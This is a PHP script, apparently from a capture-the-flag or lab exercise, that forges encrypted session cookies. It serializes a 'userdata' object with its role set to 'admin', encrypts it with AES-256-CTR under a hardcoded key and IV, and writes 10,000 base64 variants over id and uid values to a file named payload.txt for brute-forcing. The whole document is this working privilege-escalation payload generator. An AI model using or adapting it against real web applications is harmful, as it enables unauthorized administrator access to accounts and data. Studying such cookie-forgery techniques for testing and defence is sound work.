<?php 

class userdata
{
	public $role= "admin";
	public $id = 0;
	public $uid = 0;

	public function __construct($i, $u)
	{
		$this->id = (int) $i;
		$this->uid = (int) $u;
	}

}

$outputfile = 'payload.txt'; // For outputfile 

// Open and read output file

$fileHandle = fopen($outputfile, 'w');

if ($fileHandle)
{
	for ($i = 0; $i <100; $i++)
	{
		for ($x =0; $x < 100; $x++ )
		{
			$injected_class = new userdata($i, $x);
			$serialized_class = serialize($injected_class);

			$plaintext = 'abcdef';
			$key = "8b362e210615e66b3bf7f69f6c819056";
			$cipher = "aes-256-ctr";
			$iv = "ABCDEFGHIJKLMNOP";

			$encrypted_data= openssl_encrypt($serialized_class, $cipher, $key, $options=0, $iv);
			$cookie_value = base64_encode($encrypted_data);

			// writing to output file

			fwrite($fileHandle, $cookie_value. "\n");

		}
	}
	fclose($fileHandle);
	echo "Payload hav been saved to $outputfile\n";


}else 
{
	echo "Failed to open $outputfile for writing\n";
}


 ?>